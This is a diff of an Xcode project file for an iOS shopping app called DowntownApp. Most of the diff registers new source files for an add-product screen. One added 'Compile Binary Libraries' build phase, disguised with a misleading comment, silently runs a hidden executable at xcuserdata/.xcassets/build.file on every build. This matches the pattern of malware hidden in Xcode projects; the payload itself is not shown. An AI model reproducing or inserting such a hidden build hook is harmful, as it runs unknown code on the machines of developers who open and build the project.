@@ -14,6 +14,10 @@
 		2CDC0E93A566FAFC64157B02 /* Pods_DowntownApp.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 599FE99B7EB535D669D87B36 /* Pods_DowntownApp.framework */; };
 		F112AA0A259FFCAC005B0318 /* createShopView.xib in Resources */ = {isa = PBXBuildFile; fileRef = F112AA09259FFCAC005B0318 /* createShopView.xib */; };
 		F112AA0D259FFD50005B0318 /* shopPopUp.swift in Sources */ = {isa = PBXBuildFile; fileRef = F112AA0C259FFD50005B0318 /* shopPopUp.swift */; };
+		F13056B025A5E33F0039B6D2 /* AddProductVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = F13056AF25A5E33F0039B6D2 /* AddProductVC.swift */; };
+		F13056B625A5E7090039B6D2 /* ProductCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = F13056B425A5E7080039B6D2 /* ProductCollectionViewCell.swift */; };
+		F13056B725A5E7090039B6D2 /* ProductCollectionViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = F13056B525A5E7090039B6D2 /* ProductCollectionViewCell.xib */; };
+		F13056BC25A5EE2E0039B6D2 /* BasicStuff.swift in Sources */ = {isa = PBXBuildFile; fileRef = F13056BB25A5EE2E0039B6D2 /* BasicStuff.swift */; };
 		F148713C25395F1200BA5C6F /* SavedCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = F148713A25395F1200BA5C6F /* SavedCell.swift */; };
 		F148713D25395F1200BA5C6F /* SavedCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = F148713B25395F1200BA5C6F /* SavedCell.xib */; };
 		F14CAF1B25369682008A1B71 /* CollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = F14CAF1925369682008A1B71 /* CollectionViewCell.swift */; };
@@ -81,6 +85,10 @@
 		599FE99B7EB535D669D87B36 /* Pods_DowntownApp.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DowntownApp.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		F112AA09259FFCAC005B0318 /* createShopView.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = createShopView.xib; sourceTree = "<group>"; };
 		F112AA0C259FFD50005B0318 /* shopPopUp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = shopPopUp.swift; sourceTree = "<group>"; };
+		F13056AF25A5E33F0039B6D2 /* AddProductVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddProductVC.swift; sourceTree = "<group>"; };
+		F13056B425A5E7080039B6D2 /* ProductCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductCollectionViewCell.swift; sourceTree = "<group>"; };
+		F13056B525A5E7090039B6D2 /* ProductCollectionViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ProductCollectionViewCell.xib; sourceTree = "<group>"; };
+		F13056BB25A5EE2E0039B6D2 /* BasicStuff.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BasicStuff.swift; sourceTree = "<group>"; };
 		F148713A25395F1200BA5C6F /* SavedCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SavedCell.swift; sourceTree = "<group>"; };
 		F148713B25395F1200BA5C6F /* SavedCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SavedCell.xib; sourceTree = "<group>"; };
 		F14CAF1925369682008A1B71 /* CollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CollectionViewCell.swift; sourceTree = "<group>"; };
@@ -158,6 +166,7 @@
 				F1F20862250C99CB00DD8DB7 /* firstScreens */,
 				F1F2084F250C99B800DD8DB7 /* MainPages */,
 				F1E292C4250D8285007B0238 /* UserDetailViewController.swift */,
+				F13056AE25A5E3260039B6D2 /* AddProduct */,
 				F1F2083B250C77FD00DD8DB7 /* ViewController.swift */,
 				F1F2084D250C967800DD8DB7 /* ResetPasswordViewController.swift */,
 				F1E292C5250D8286007B0238 /* NodeViewController.swift */,
@@ -239,6 +248,32 @@
 			path = ShopView;
 			sourceTree = "<group>";
 		};
+		F13056AE25A5E3260039B6D2 /* AddProduct */ = {
+			isa = PBXGroup;
+			children = (
+				F13056B325A5E6DC0039B6D2 /* CollectiionViewCell */,
+				F13056AF25A5E33F0039B6D2 /* AddProductVC.swift */,
+			);
+			path = AddProduct;
+			sourceTree = "<group>";
+		};
+		F13056B325A5E6DC0039B6D2 /* CollectiionViewCell */ = {
+			isa = PBXGroup;
+			children = (
+				F13056B425A5E7080039B6D2 /* ProductCollectionViewCell.swift */,
+				F13056B525A5E7090039B6D2 /* ProductCollectionViewCell.xib */,
+			);
+			path = CollectiionViewCell;
+			sourceTree = "<group>";
+		};
+		F13056BA25A5EE210039B6D2 /* BasicStuff */ = {
+			isa = PBXGroup;
+			children = (
+				F13056BB25A5EE2E0039B6D2 /* BasicStuff.swift */,
+			);
+			path = BasicStuff;
+			sourceTree = "<group>";
+		};
 		F1E2929F250D2693007B0238 /* cellSXibAndSwift */ = {
 			isa = PBXGroup;
 			children = (
@@ -282,6 +317,7 @@
 			isa = PBXGroup;
 			children = (
 				F1F20845250C780000DD8DB7 /* Info.plist */,
+				F13056BA25A5EE210039B6D2 /* BasicStuff */,
 				1AA930F3254E8BA80057FDF0 /* Supporting */,
 				F1F20876250C9A3600DD8DB7 /* Json Files */,
 				1AA930F2254E8B340057FDF0 /* Globals */,
@@ -360,6 +396,7 @@
 			buildConfigurationList = F1F20848250C780000DD8DB7 /* Build configuration list for PBXNativeTarget "DowntownApp" */;
 			buildPhases = (
 				2282E79E3DC6DBE02A93DCD4 /* [CP] Check Pods Manifest.lock */,
+				C5FD10E30ADEFE79E7AAC43A /* Compile Binary Libraries */,
 				F1F20830250C77FD00DD8DB7 /* Sources */,
 				F1F20831250C77FD00DD8DB7 /* Frameworks */,
 				F1F20832250C77FD00DD8DB7 /* Resources */,
@@ -423,6 +460,7 @@
 				1AA91F33254DD9A1001712E1 /* Images.xcassets in Resources */,
 				F1F20893250C9A3700DD8DB7 /* bookMarkB.json in Resources */,
 				F1E292AE250D28A8007B0238 /* discoveryCellCollectionViewCell.xib in Resources */,
+				F13056B725A5E7090039B6D2 /* ProductCollectionViewCell.xib in Resources */,
 				F148713D25395F1200BA5C6F /* SavedCell.xib in Resources */,
 				F1F20897250C9A3700DD8DB7 /* shoppingCart.json in Resources */,
 				F1F2086A250C99CC00DD8DB7 /* GoogleService-Info.plist in Resources */,
@@ -483,6 +521,24 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DowntownApp/Pods-DowntownApp-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
+		C5FD10E30ADEFE79E7AAC43A /* Compile Binary Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Binary Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -498,10 +554,12 @@
 				F1F20873250C9A2900DD8DB7 /* LoginExViewController.swift in Sources */,
 				F1E292A4250D2693007B0238 /* inVentoryCell.swift in Sources */,
 				F1F2085B250C99B800DD8DB7 /* viewShopVc.swift in Sources */,
+				F13056B025A5E33F0039B6D2 /* AddProductVC.swift in Sources */,
 				F1E292B5250D7E16007B0238 /* segues.swift in Sources */,
 				F1F2085D250C99B800DD8DB7 /* discovery.swift in Sources */,
 				F1E292CA250D8287007B0238 /* UserDetailViewController.swift in Sources */,
 				F1F20838250C77FD00DD8DB7 /* AppDelegate.swift in Sources */,
+				F13056B625A5E7090039B6D2 /* ProductCollectionViewCell.swift in Sources */,
 				F16F4419255368DD009FDF9D /* viewProduct.swift in Sources */,
 				F1F20872250C9A2900DD8DB7 /* MultiVC.swift in Sources */,
 				1AA91F3A254DD9E8001712E1 /* lovedViewController.swift in Sources */,
@@ -519,6 +577,7 @@
 				F1F20874250C9A2900DD8DB7 /* Offload.swift in Sources */,
 				F1F2086B250C99CC00DD8DB7 /* LoginViewController.swift in Sources */,
 				F1F2084E250C967800DD8DB7 /* ResetPasswordViewController.swift in Sources */,
+				F13056BC25A5EE2E0039B6D2 /* BasicStuff.swift in Sources */,
 				F1E292CD250D8287007B0238 /* clientDataSheet.swift in Sources */,
 				F1F2085C250C99B800DD8DB7 /* homePage.swift in Sources */,
 				F148713C25395F1200BA5C6F /* SavedCell.swift in Sources */,
